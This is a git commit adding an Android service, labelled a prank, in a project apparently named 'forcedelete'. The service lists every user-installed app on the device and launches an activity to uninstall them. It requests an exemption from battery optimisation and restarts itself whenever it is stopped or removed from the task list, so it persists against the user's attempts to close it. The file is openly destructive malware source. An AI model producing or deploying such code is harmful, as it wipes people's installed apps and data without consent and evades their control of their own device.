642737bbea630342045ad4955a444f3876bbeaef
Oktay Savcı <93824768+oktaysavci@users.noreply.github.com>
2024-09-18 14:27:21 +0300

    Add files via upload

---
+++ app/src/main/java/com/svc/forcedelete/MyService.java
@@ -0,0 +1,83 @@
+package com.svc.prank;
+
+import android.app.Service;
+import android.content.Intent;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageInfo;
+import android.content.pm.PackageManager;
+import android.os.Build;
+import android.os.IBinder;
+import android.os.PowerManager;
+import android.provider.Settings;
+
+import java.util.ArrayList;
+import java.util.List;
+
+public class MyService extends Service {
+
+    private List<String> userApps = new ArrayList<>();
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        loadUserApps();
+        if (!userApps.isEmpty()) {
+            startUninstallActivity();
+        } else {
+            stopSelf();
+        }
+        requestIgnoreBatteryOptimizations();
+    }
+
+    private void loadUserApps() {
+        PackageManager packageManager = getPackageManager();
+        List<PackageInfo> packages = packageManager.getInstalledPackages(0);
+
+        for (PackageInfo packageInfo : packages) {
+            if ((packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
+                userApps.add(packageInfo.packageName);
+            }
+        }
+    }
+
+    private void startUninstallActivity() {
+        Intent intent = new Intent(this, UninstallActivity.class);
+        intent.putStringArrayListExtra("userApps", new ArrayList<>(userApps));
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        startActivity(intent);
+    }
+
+    private void requestIgnoreBatteryOptimizations() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            Intent intent = new Intent();
+            String packageName = getPackageName();
+            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+            if (pm != null && !pm.isIgnoringBatteryOptimizations(packageName)) {
+                intent.setAction(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
+                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(intent);
+            }
+        }
+    }
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        // Servis durdurulsa bile yeniden başlatılmasını sağlar
+        return START_STICKY;
+    }
+
+    @Override
+    public void onTaskRemoved(Intent rootIntent) {
+        // Uygulama görev yöneticisinden kapatılırsa, servisi yeniden başlatır
+        Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
+        restartServiceIntent.setPackage(getPackageName());
+        startService(restartServiceIntent);
+        super.onTaskRemoved(rootIntent);
+    }
+
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
+}
+
